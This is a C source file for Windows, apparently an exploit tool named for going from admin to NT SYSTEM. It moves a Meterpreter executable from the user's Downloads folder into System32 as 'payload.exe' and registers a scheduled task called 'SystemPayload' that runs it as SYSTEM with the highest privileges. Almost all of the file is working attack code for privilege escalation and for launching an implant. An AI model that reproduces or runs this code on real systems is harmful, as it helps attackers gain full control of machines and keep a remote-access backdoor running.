#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <shlobj.h>
#include <strsafe.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")


//  ┓      ┓       ┓  ┓   
// ┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
// ┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
//            ┛          ┛
// ┳┓┏┓┓┏┏┓┏┓┓┏┓          
// ┃┃ ┫┣┫┣┫┃ ┃┫           
// ┻┛┗┛┛┗┛┗┗┛┛┗┛   
//x86_64-w64-mingw32-gcc Exp_SelfElevated_AdminToNTSystem.c -o winapi_bypass.exe -lole32 -luuid -lcomsupp -lcomdlg32 -lshell32


HRESULT CreateSystemTask(LPCWSTR exePath) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return hr;

    // Set general COM security
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, 0, NULL);
    if (FAILED(hr)) return hr;

    // Connect to Task Scheduler
    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) return hr;

    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(hr)) return hr;

    // Get root folder
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) return hr;

    // Delete if exists
    pRootFolder->DeleteTask(_bstr_t(L"SystemPayload"), 0);

    // Create new task definition
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) return hr;

    // Set principal to run as SYSTEM
    IPrincipal* pPrincipal = NULL;
    pTask->get_Principal(&pPrincipal);
    pPrincipal->put_Id(_bstr_t(L"Author"));
    pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
    pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
    pPrincipal->put_UserId(_bstr_t(L"SYSTEM"));
    pPrincipal->Release();

    // Trigger (run once, immediate)
    ITriggerCollection* pTriggers = NULL;
    pTask->get_Triggers(&pTriggers);

    ITrigger* pTrigger = NULL;
    pTriggers->Create(TASK_TRIGGER_TIME, &pTrigger);
    ITimeTrigger* pTimeTrigger = NULL;
    pTrigger->QueryInterface(IID_ITimeTrigger, (void**)&pTimeTrigger);
    pTimeTrigger->put_Id(_bstr_t(L"Trigger1"));

    // Set start boundary to "now"
    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR timeBuf[64];
    swprintf_s(timeBuf, 64, L"%04d-%02d-%02dT%02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute + 1, st.wSecond);
    pTimeTrigger->put_StartBoundary(_bstr_t(timeBuf));
    pTimeTrigger->Release();
    pTrigger->Release();
    pTriggers->Release();

    // Action: execute payload
    IActionCollection* pActions = NULL;
    pTask->get_Actions(&pActions);
    IAction* pAction = NULL;
    pActions->Create(TASK_ACTION_EXEC, &pAction);

    IExecAction* pExecAction = NULL;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pExecAction->put_Path(_bstr_t(exePath));
    pExecAction->Release();
    pAction->Release();
    pActions->Release();

    // Register the task
    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(L"SystemPayload"),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_SERVICE_ACCOUNT,
        _variant_t(L""),
        &pRegisteredTask
    );

    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
    return hr;
}

int wmain() {
    WCHAR src[MAX_PATH], dest[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, src))) {
        StringCchCatW(src, MAX_PATH, L"\\Downloads\\meterpreter.exe");
        StringCchCopyW(dest, MAX_PATH, L"C:\\Windows\\System32\\payload.exe");

        if (MoveFileExW(src, dest, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING)) {
            wprintf(L"[+] Payload moved.\n");

            if (SUCCEEDED(CreateSystemTask(dest))) {
                wprintf(L"[+] SYSTEM scheduled task created!\n");
            } else {
                wprintf(L"[-] Failed to create SYSTEM task.\n");
            }
        } else {
            wprintf(L"[-] Failed to move payload.\n");
        }
    }
    return 0;
}
